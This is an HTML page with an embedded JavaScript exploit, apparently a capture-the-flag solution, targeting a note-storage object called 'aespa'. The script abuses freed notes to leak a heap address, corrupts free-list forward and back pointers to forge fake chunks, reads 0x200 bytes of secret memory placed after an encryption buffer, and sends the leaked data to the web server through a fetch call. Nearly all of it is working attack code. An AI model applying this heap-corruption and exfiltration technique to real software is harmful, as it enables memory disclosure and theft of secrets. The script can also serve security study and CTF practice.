<!doctype html>
<meta charset="utf-8">
<script>
function addstr(s) {
  const bytes  = Array.from(new TextEncoder().encode(s));
  return add(bytes);
}

function add(arr) {
  return aespa.secure_addNote(arr); 
}

function edit(idx, arr) {
  return aespa.secure_edit(arr, idx); 
}

function del(idx) {
  return aespa.secure_deleteNote(idx);
}

function read(idx) {
  return aespa.secure_getId(idx);
}

function enc() {
  return aespa.secure_encryption()
}


// Secret debugging technique
function sleep(s) {
  const ms = 1000 * s
  const start = Date.now();
  while (Date.now() - start < ms) {}
}

function hex(x) {
  console.log("0x"+x.toString(16));
}

// Convert BigInt to Array that can pass to add/edit
function pack(num) {
 
 const result = new Array(8);
  
  for (let i = 0; i < 8; i++) {
    result[i] = Number(num & 0xFFn);
    num >>= 8n;
  }
  
  return result;
}

function edit2(idx, arr) {
  const arr2 = arr.map(item => item === 0 ? 0xFF : item);

  edit(idx, arr2);
  while (arr.lastIndexOf(0) != -1)
  {
    const zero_idx = arr.lastIndexOf(0);
    const to_write = arr2.slice(0, zero_idx+1);

    to_write[zero_idx] = 0x00;
    edit(idx, to_write);
    arr[zero_idx] = 0xFF;
  }
}

function exploit()
{
  // Allocate aaaa and bbbb
  const junk  = Array.from(new TextEncoder().encode("JUNK"));
  const aaaa  = add(junk);
  const bbbb  = add(junk);
                add(junk); // guard
  // Free aaaa and bbbb to make bbbb.FWD == aaaa
  del(aaaa);
  del(bbbb);

  // Leak heap address from aaaa (read bbbb.FWD)
  const heap          = BigInt(read(aaaa)) - 0x40n;

  // Compute addresses we need using fixed heap offset
  const secrets_start = heap + 0x0e0n;
  const biba_start    = heap + 0x0a0n;
  const head          = heap + 0x010n;
  hex(heap);

  // Make free list empty after the heap address leak
  add(junk);
  add(junk);

  // Create Biba and Boba
  let biba  = add(junk);
  let boba  = add(junk);

  // Trigger encryption to put it's results right after Boba
  enc();

  // Leak first qword using real Boba
  let leak = BigInt(read(boba)).toString(16);
  hex(BigInt(read(boba)));

  // Define how much we want to leak from the heap right after boba
  const leaksz = 0x200n;
  let   leaked = 0x008n;
  while (leaked < leaksz)
  {
    // Free Biba
    del(biba);
    
    // Write the next fake Boba address to the Biba.FWD
    let arr = pack(secrets_start-0x20n+leaked); // FWD
        arr = arr.concat(pack(head));           // BKD
    edit2(biba, arr);

    // Write fake Boba to it's place using the previous one
    arr =            pack(0x20n);       // SIZE
    arr = arr.concat(pack(0x00n));      // FWD
    arr = arr.concat(pack(biba_start)); // BKD
    edit2(boba, arr);

    // Allocate Biba back
    biba = add(junk);
    // Allocate new fake Boba
    boba = add(junk);

    // Read the leak
    const new_leak = BigInt(read(boba))
    hex(new_leak);
    leak   += '+'+ new_leak.toString(16);
    leaked += 0x08n;

    // Free the fake Boba to avoid note's amount exhausting
    del(boba);
  }

  // Send the leak back to the web server
  fetch("/"+leak);
}

exploit();
</script>
